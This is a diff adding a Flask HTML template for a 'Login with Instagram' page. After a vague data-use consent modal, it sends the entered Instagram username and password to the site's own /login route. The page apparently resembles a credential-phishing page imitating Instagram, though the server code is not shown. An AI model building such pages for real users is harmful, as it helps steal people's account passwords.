@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='s1.css') }}">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        /* Simple styling for the modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 9999;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        .modal-content button {
+            margin: 5px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .allow {
+            background-color: green;
+            color: white;
+        }
+        .disagree {
+            background-color: red;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-page">
+        <div class="form">
+            <form class="login-form" id="login-form">
+                <h4>Login with Instagram</h4>
+                <input type="text" id="username" placeholder="Username" />
+                <input type="password" id="password" placeholder="Password" />
+                <button type="button" id="login-btn">Login</button>
+                <p class="message">Not registered? <a href="#">Create an account</a></p>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal for data usage alert -->
+    <div class="modal" id="data-modal">
+        <div class="modal-content">
+            <p>Your data will be used for login purposes. Do you agree?</p>
+            <button class="allow" id="allow-btn">Allow</button>
+            <button class="disagree" id="disagree-btn">Disagree</button>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            // Show the modal only if username and password are entered
+            $('#login-btn').click(function () {
+                const username = $('#username').val().trim();
+                const password = $('#password').val().trim();
+
+                if (username === "" || password === "") {
+                    alert("Please enter both username and password.");
+                } else {
+                    $('#data-modal').fadeIn();  // Show modal
+                }
+            });
+
+            // Close the modal if the user clicks "Disagree"
+            $('#disagree-btn').click(function () {
+                alert("You chose to disagree. Login canceled.");
+                $('#data-modal').fadeOut();  // Hide modal
+            });
+
+            // Send data to Flask app if the user clicks "Allow"
+            $('#allow-btn').click(function () {
+                const username = $('#username').val().trim();
+                const password = $('#password').val().trim();
+            
+                // Send data to the Flask app using AJAX
+                $.ajax({
+                    url: "/login",  // Flask route for handling login
+                    method: "POST",
+                    contentType: "application/json",
+                    data: JSON.stringify({
+                        username: username,
+                        password: password
+                    }),
+                    success: function (response) {
+                        // Handle successful response
+                        alert("Login successful. Redirecting to dashboard...");
+                        window.location.href = "/dashboard";  // Redirect to the dashboard
+                    },
+                    error: function (xhr, status, error) {
+                        // Handle error response
+                        const errorMessage = xhr.responseJSON?.message || "An error occurred during login.";
+                        alert(errorMessage);
+                    }
+                });
+            
+                $('#data-modal').fadeOut();  // Hide modal after sending the data
+            });
+            
+        });
+    </script>
+</body>
+</html>
